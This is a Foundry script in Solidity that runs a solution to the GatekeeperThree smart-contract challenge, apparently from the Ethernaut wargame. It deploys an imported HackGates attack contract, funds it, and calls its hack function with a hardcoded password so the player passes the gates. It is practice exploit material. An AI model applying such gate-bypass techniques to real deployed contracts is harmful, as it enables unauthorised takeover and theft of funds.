//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Script.sol";
import "../src/HackGates.sol";

contract OpenGates is Script {
    address public player = 0x8656D273630865bB4887E00d86a338A214Ac4b50;

    function run() public {
        vm.label(player, "Player");

        vm.startBroadcast(player);
        
        HackGates hack = new HackGates();
        vm.label(address(hack), "HackGates");
        GatekeeperThree gates = hack.gates();
        vm.label(address(gates), "GatekeeperThree");

        payable(hack).transfer(1000000000000001 wei);
        console.log("Funds at hack: ",address(hack).balance);
        console.log("Funds at gates: ",address(gates).balance);
        require(address(hack).balance > 0, "Initial funds not transferred.");
        console.log("Funds at hack: ",address(hack).balance);
        console.log("Funds at gates: ",address(gates).balance);

        uint _password = 1674707108; //hack.setTrick();
        console.log("Password: ", _password);
        (bool success) = hack.hack(_password);
       
        require(success == true, "Hack failed.");
        require(player == address(gates.entrant()), "Player no entrant.");

        vm.stopBroadcast();
    }
}